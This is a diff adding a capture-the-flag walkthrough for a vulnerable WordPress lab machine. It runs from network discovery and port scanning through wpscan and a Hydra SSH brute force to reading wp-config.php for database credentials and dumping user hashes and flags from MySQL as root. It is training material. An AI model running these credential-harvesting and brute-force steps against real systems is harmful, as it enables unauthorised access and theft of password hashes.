@@ -1,0 +1,78 @@
+1:
+Find Ip for target Machine by using:
+ 
+        netdiscover -i <interface> -r <Ip>/24 
+
+Take the Ip's from the results and put it in a text file called IPs.txt
+
+2:
+Port Scan the IP's 
+      
+      nmap -F -iL <directory path>/IPs.txt 
+
+use this to find the target machine we will call it <IP> from here out because depending on VM settings the #'s can be different
+      
+3: 
+Nmap will reveal that port 80 is open so naturally
+
+      nikto -h http://<IP>/
+      
+4:
+nikto will show wordpress is installed 
+
+5:
+Inspect Elements on <IP>/services.html to find flag1
+
+6: 
+
+      wpscan the <IP>/wordpress/ site 
+      check out the commands folder for the specific command 
+7: 
+      attack the ssh protocal with the usernames list you found 
+      use Hydra, check the commands folder for the specific command 
+
+8: 
+Now you have micheales creds 
+
+        ssh michael@<IP> 
+          password: <you should know it from earlier wont be that easy>
+          
+9: 
+Now we are in 
+
+        cd ./var/www/
+        ls -l 
+        cat flag2
+        
+10: read the wordpress config file for the DB info 
+
+        michael@Raven:~$ cat /var/www/html/wordpress/wp-config.php
+
+11: 
+Hopefully we realized by now that if its Wordpress we are attacking which is just controls serving the webpage and directory we realize that theres a DB as well with this info 
+and what other DB to check for then the infamous Mysql 
+
+      mysql -u root -p
+      password: <use the password from teh config file we read in step 10>
+      
+12:
+Now that you have signed into the mysql server you shoul dhave the mysql> cmd line 
+
+  A: 
+    mysql> show databases;
+  B:
+    mysql> use wordpress;
+  C: 
+    mysql> show tables;
+  D:
+  mysql> select * from wp_users; #gives the hashes for users BUT!!!!#
+  E!: 
+    mysql> select * from wp_users;
+    
+     that will give you flag 3 and 4 and thats it all 4 flags found with root access to DB thats mission complete!
+    
+
+    
+
+    
+      
